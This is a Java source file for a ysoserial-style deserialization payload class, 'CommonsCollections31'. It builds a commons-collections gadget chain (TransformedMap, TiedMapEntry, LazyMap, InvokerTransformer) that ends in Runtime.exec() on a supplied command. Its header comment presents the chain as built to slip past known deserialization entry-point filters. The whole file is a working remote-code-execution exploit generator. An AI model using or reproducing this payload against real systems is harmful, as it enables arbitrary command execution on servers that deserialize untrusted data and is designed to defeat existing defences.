package ysoserial.payloads;

import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	TransformedMap entry point — bypasses HashMap/HashSet/Hashtable/PQ/TreeBag filters.

	Gadget chain:
		ObjectInputStream.readObject()
			TransformedMap.readObject()       // AbstractInputCheckedMapDecorator
				HashMap.put(key, value)       // reconstructs backing map
					key.hashCode()
						TiedMapEntry.hashCode()
							TiedMapEntry.getValue()
								LazyMap.get()
									ChainedTransformer.transform()
										InvokerTransformer.transform()
											Method.invoke()
												Runtime.exec()

	TransformedMap was the original CC1 root in the 2015 Frohoff & Lawrence
	paper, but ysoserial replaced it with AnnotationInvocationHandler. As a
	standalone entry point, it is absent from all current ysoserial payloads
	and filter lists.

	Filter evasion:
		1. TransformedMap (o.a.c.c.map) — not in any known filter as entry point
		2. Bypasses all standard entry point checks:
		   HashMap, HashSet, Hashtable, PriorityQueue, TreeBag,
		   ConcurrentHashMap, ConcurrentSkipListMap, PriorityBlockingQueue
		3. Same InvokerTransformer sink as CC6/CC7

	Discovered by web-fuzzer automated gadget chain analysis (9-hour session).

	Requires:
		commons-collections 3.1+
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.DMBS335 })
public class CommonsCollections31 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {

		final String[] execArgs = new String[] { command };

		// Inert transformer during setup — LazyMap.get("foo") returns 1, harmless
		final Transformer[] fakeTransformers = new Transformer[] {
			new ConstantTransformer(1) };
		final ChainedTransformer transformerChain = new ChainedTransformer(fakeTransformers);

		// Real transformers to arm later
		final Transformer[] realTransformers = new Transformer[] {
			new ConstantTransformer(Runtime.class),
			new InvokerTransformer("getMethod", new Class[] {
				String.class, Class[].class }, new Object[] {
				"getRuntime", new Class[0] }),
			new InvokerTransformer("invoke", new Class[] {
				Object.class, Object[].class }, new Object[] {
				null, new Object[0] }),
			new InvokerTransformer("exec",
				new Class[] { String.class }, execArgs),
			new ConstantTransformer(1) };

		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		// TransformedMap as entry gadget
		// Using null key/value transformers — we only need the readObject trigger
		// Adding TiedMapEntry as key triggers hashCode() → LazyMap.get("foo")
		// → ConstantTransformer(1) → returns 1 (safe during setup)
		TransformedMap map = (TransformedMap) TransformedMap.decorate(new HashMap(), null, null);
		map.put(entry, "bar");

		// Remove the cached "foo"→1 entry from innerMap so the
		// LazyMap fires again on deserialization
		innerMap.remove("foo");

		// Arm the transformer chain
		Reflections.setFieldValue(transformerChain, "iTransformers", realTransformers);

		return map;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections31.class, args);
	}
}
